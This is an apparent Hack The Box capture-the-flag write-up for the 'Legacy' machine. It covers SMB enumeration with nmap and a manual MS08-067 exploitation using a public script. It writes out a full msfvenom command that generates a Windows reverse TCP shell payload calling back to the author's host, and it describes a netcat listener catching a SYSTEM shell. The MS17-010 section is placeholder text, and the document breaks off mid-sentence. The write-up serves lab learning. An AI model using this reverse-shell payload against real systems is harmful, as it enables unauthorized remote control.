![legacy](https://user-images.githubusercontent.com/43796175/105492077-5e740680-5c85-11eb-8224-07901100704c.jpg)

## LEGACY: Write Up

In this machine i learn about MS-08-067 (CVE-2008-4250) and MS-17-010 (CVE-2017-0143), two exploits of SMB. Exploit this vulnerability manually is simple.

# 01: Information Gathering

First of all i ran nmap with basic commands and i saw two open ports and one closed:

![nmap](https://user-images.githubusercontent.com/43796175/105779180-cf444880-5f3b-11eb-8233-22831472876c.jpg)

Then i did a deeper scan with nmap against 445 port:

![smbnmap](https://user-images.githubusercontent.com/43796175/105779606-b5573580-5f3c-11eb-87a3-a4b20fd80a5b.jpg)
![smbnmap02](https://user-images.githubusercontent.com/43796175/105779613-b7b98f80-5f3c-11eb-86f4-92610487a8b2.jpg)

Nmap showed MS-08-067 (CVE-2008-4250) and MS-17-010 (CVE-2017-0143) are very interesting to exploit.

# 02: Threat Modeling

In my mental map smbclient and smbmap were the first option to test, but without results:

![smbno](https://user-images.githubusercontent.com/43796175/105781825-3d3f3e80-5f41-11eb-8e15-73347d9c62f0.jpg)


# 03: Vulnerability Analysis

Both of these vulnerabilities (MS-08-067 & MS-17-010) gives a shell as system and each one have a metasploit module for exploit easily but i will show how exploit this manually.

# 04: Exploitation

## MS-08-067

I will use [this exploit](https://github.com/andyacer/ms08_067) for exploit the vulnerability, this script requires impacket and replace the default shellcode with some of my own. Ok, to make the shellcode i used *msfvenom*:

`
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.11 LPORT=443 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f py -v shellcode -a x86 --platform windows
`


![venom,](https://user-images.githubusercontent.com/43796175/105800547-fb27f400-5f64-11eb-9111-86f7272892ed.jpg)

The parameters are:

* -p: Type of payload (Single payload, you can learn about this [here](https://github.com/rapid7/metasploit-framework/wiki/How-payloads-work) )
* LHOST: Host where reverse connection is follow
* LPORT: Port where reverse connection is follow
* EXITFUNC: How is the exit
* -b: The bad characters not to use (The script gave me this)
* -f: Output in python format
* -v: Have the code set the variable *shellcode*
* -a: Architecture of the output
* --platform: OS for script (Windows in this case)

Then i will take this shellcode into the script and replace in the original:

![replce](https://user-images.githubusercontent.com/43796175/105800728-6b367a00-5f65-11eb-98b4-e046daddc172.jpg)

The exploit require that i know the version of Windows and language pack are running in the victim. I ran nmap again for this purpose:

![os](https://user-images.githubusercontent.com/43796175/105800920-e9931c00-5f65-11eb-9d2a-2bed37a3e6ba.jpg)

Apparently the version can be Windows XP, and with the language pack i tried to find the right one.

NOTE: In this point, i had a problem with *pip* and *pip3* in Parrot OS Security, for repair part [this problem](https://forum.hackthebox.eu/discussion/3940/installing-pip2-apt-install-python-pip-no-longer-works) i need a file "*get_pip.py*" provided by [Dr. Zaiuss](https://github.com/zaiuss). You can find this file [*here*](https://github.com/0xCGonzalo/HtB-Write-Ups/blob/main/Machines/Legacy/get_pip.py)

Now, i set a netcat in the port 443 (configured in my shellcode):

![nc](https://user-images.githubusercontent.com/43796175/105801440-1f84d000-5f67-11eb-9ce4-6d4a88410f89.jpg)

And i run the script:

![okcon](https://user-images.githubusercontent.com/43796175/105801530-4d6a1480-5f67-11eb-9ae5-b0d2467afe71.jpg)

I checked my connection and i got a reverse shell:

![ok1](https://user-images.githubusercontent.com/43796175/105801634-85715780-5f67-11eb-803c-6a6c43970390.jpg)

## MS-17-010

asdasdasd

# 05: Post-Exploitation

As you may noticed, the system command "*whoami*" doesn't work in anyone case. Let's fix this.

First, is necessary check the path of this binary in your system (i'm running Parrot OS, but in Kali Linux work fine):


